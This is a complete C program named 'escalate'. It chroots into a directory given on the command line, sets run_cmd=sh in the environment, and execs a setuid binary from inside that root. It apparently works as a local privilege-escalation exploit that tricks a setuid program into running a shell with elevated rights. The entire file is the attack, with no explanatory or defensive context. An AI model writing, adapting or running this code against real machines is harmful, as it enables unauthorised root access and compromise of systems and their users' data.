#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "usage: escalate <chroot_dir> <suidexe>\n");
        return EXIT_FAILURE;
    }

    const char *chroot_dir = realpath(argv[1], NULL);
    if (chroot_dir == NULL) {
        perror("chroot_dir");
        return EXIT_FAILURE;
    }

    const char *suidexe = realpath(argv[2], NULL);
    if (suidexe == NULL) {
        perror("suidexe");
        return EXIT_FAILURE;
    }

    if (chdir("/") != 0) {
        perror("chdir");
        return EXIT_FAILURE;
    }

    if (chroot(chroot_dir) != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }

    if (setenv("run_cmd", "sh", 1) != 0) {
        perror("setenv");
        exit(EXIT_FAILURE);
    }

    char path[PATH_MAX];
    snprintf(path, PATH_MAX, ".%s", suidexe);
    execl(path, path, NULL);

    perror("exec");
    return EXIT_FAILURE;
}
